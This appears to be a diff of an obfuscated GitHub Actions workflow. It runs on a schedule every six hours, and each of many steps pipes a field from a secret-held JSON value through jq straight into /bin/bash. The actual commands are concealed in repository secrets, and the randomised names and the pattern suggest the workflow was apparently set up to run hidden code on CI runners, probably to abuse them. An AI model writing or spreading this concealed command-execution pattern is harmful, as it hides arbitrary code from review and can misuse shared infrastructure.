@@ -2,25 +2,31 @@ name: yuaniklkkx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 4/6 * * *'
-
+    - cron: '40 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yuaniklkkx
         env:
-          rxtuy11159: ${{ secrets.rxtuy11159 }}
+          yr0923: ${{ secrets.yr0923 }}
         run: |
-          echo $rxtuy11159 | jq -r .tws19 | /bin/bash
-          echo $b020 | jq -r .thfs54287 | /bin/bash
-          echo $e463 | jq -r .umvb442 | /bin/bash
-          echo $p56875 | jq -r .um1 | /bin/bash
-          echo $cbqi25 | jq -r .ld2 | /bin/bash
-          echo $cpmuf73171 | jq -r .k91 | /bin/bash
-          echo $phmbx2 | jq -r .opn7733 | /bin/bash
-          echo $j70 | jq -r .hg45441 | /bin/bash
-          echo $nc10 | jq -r .nqe540 | /bin/bash
+          echo $yr0923 | jq -r .f7 | /bin/bash
+          echo $xdwan568 | jq -r .vdolu18106 | /bin/bash
+          echo $ni06 | jq -r .f8 | /bin/bash
+          echo $j12431 | jq -r .ueoe1035 | /bin/bash
+          echo $kxbb3739 | jq -r .w32630 | /bin/bash
+          echo $zjtzy3579 | jq -r .ept868 | /bin/bash
+          echo $ryit873 | jq -r .rhhm21879 | /bin/bash
+          echo $aik2 | jq -r .cqk48878 | /bin/bash
+          echo $qnlhx469 | jq -r .wb0877 | /bin/bash
+          echo $nkx6821 | jq -r .jyisf8777 | /bin/bash
+          echo $lkxss1 | jq -r .quqe75840 | /bin/bash
+          echo $legzd90 | jq -r .xw356 | /bin/bash
+          echo $tw162 | jq -r .ysss731 | /bin/bash
+          echo $pdhke75574 | jq -r .w69 | /bin/bash
+          echo $g12 | jq -r .ppauy59 | /bin/bash
+          echo $nhww67 | jq -r .tdb112 | /bin/bash
+          echo $s2 | jq -r .da77782 | /bin/bash
 
